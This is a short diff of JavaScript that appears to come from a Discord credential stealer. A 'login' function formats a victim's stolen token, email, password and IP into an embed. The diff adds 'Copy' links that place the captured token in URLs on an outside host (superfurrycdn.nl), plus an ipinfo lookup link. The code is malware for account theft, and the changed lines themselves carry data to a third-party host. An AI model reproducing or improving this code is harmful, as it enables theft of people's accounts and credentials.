@@ -582,22 +582,22 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<a:946246524634009600:990956317101424650> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
+            value: `\`${token}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
             name: '<:946246524516581396:990956286189383780> Email:',
-            value: `\`${email}\``,
+            value: `\`${email}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
           {
             name: '<:946246524826968104:990956293919490068> IP:',
-            value: `\`${config.ip}\``,
+            value: `\`${config.ip}\`\n[\`IpInfo\`](https://ipinfo.io/{ip})`,
             inline: true,
           },
           {
             name: '<a:946246524302655501:990956306355593276> Password:',
-            value: `\`${password}\``,
+            value: `\`${password}\`\n[\`Copy\`](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
         ],
